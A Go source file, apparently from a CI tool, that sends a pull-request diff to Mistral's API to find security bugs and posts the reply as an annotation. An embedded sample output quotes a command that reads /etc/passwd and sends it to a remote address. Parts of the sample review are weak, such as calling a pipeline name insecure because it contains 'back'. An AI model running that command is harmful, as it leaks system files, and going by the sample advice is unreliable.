package mistral

import (
	"fmt"
	"os"
	"strings"

	mg "github.com/gage-technologies/mistral-go"
	"github.com/openshift-pipelines/pipelines-as-code/pkg/apis/pipelinesascode/v1alpha1"
	"github.com/openshift-pipelines/pipelines-as-code/pkg/params/info"
	"github.com/openshift-pipelines/pipelines-as-code/pkg/provider"
	"go.uber.org/zap"
)

const (
	prompt        = `can you look over a diff and see if there is any security bug, make the output as json and only as json make sure to remove any double quotes inside the json value the, json has those fields, error_type (a classification type), path (without the initial diff prefix like b/ a/), line, column, error (the error explained), suggestion (suggestion how to fix it)`
	exampleOutput = `based on the provided diff, here are the potential security issues and suggestions for fixing them:\n\n1. Insecure pipeline names:\nThe pipeline names 'scratchmyback-bad' and (formerly) 'scratchmyback-manual' contain the word \"back\" which could potentially be an indicator of a vulnerability scan or an attacker's reconnaissance. It is recommended to give your pipelines descriptive and less predictable names. Change 'scratchmyback-bad' to something like 'example-pipeline'.\n\n2. Exposed script commands:\nIn 'noop-task' in both 'manual.yaml' and (formerly) 'pr.yaml' files, there are plain-text commands ('echo \"hello {{ pull_request_number }}\"' and 'cancel -u \"$(cat /etc/passwd)\" -h 169.254.0.1:1234') visible in the scripts. This can potentially allow attackers to see and execute arbitrary commands. Instead, use a Docker image with the required command already included or place the sensitive script commands in a separate file and reference it through the Dockerfile.\n\nRegarding the missing 'pr.yaml' file, it appears that it was accidentally deleted and no longer exists. It is not possible to provide specific suggestions for security-related issues with this file, as it’s not available. However, keeping sensitive configurations or pipeline definitions in version control without proper access controls may expose them to unauthorized users, create vulnerabilities, or cause unintended consequences. Consider implementing secure access control policies and reviewing the deleted configuration.`
)

// PromptAI checks if there is a security error in the diff via mistral
func PromptAI(logger *zap.SugaredLogger, event *info.Event, repository *v1alpha1.Repository) ([]provider.Annotation, error) {
	var errors []provider.Annotation
	mistraApiEnv := os.Getenv("MISTRAL_API_KEY")
	if mistraApiEnv == "" {
		return errors, fmt.Errorf("MISTRAL_API_KEY is not set")
	}
	client := mg.NewMistralClientDefault(mistraApiEnv)
	content := fmt.Sprintf("%s, here is the content of the diff: %s", repository.Spec.Settings.AI.Prompt, event.DiffCommit)
	chatRequestParams := &mg.DefaultChatRequestParams
	chatRequestParams.Temperature = repository.Spec.Settings.AI.Temperature
	chatRequestParams.MaxTokens = repository.Spec.Settings.AI.MaxTokens
	logger.Infof("about to ask mistral, temperature: %f, engine: %s, prompt: %s",
		repository.Spec.Settings.AI.Temperature, repository.Spec.Settings.AI.Engine, repository.Spec.Settings.AI.Prompt)
	chatRes, err := client.Chat(repository.Spec.Settings.AI.Engine,
		[]mg.ChatMessage{{Content: content, Role: mg.RoleUser}}, chatRequestParams)
	if err != nil {
		return errors, fmt.Errorf("error asking mistral: %v", err)
	}
	output := chatRes.Choices[0].Message.Content
	output = strings.ReplaceAll(output, "\\n", "<br>")
	resErr := []provider.Annotation{{
		Error: output,
		Line:  1,
	}}
	return resErr, nil
}
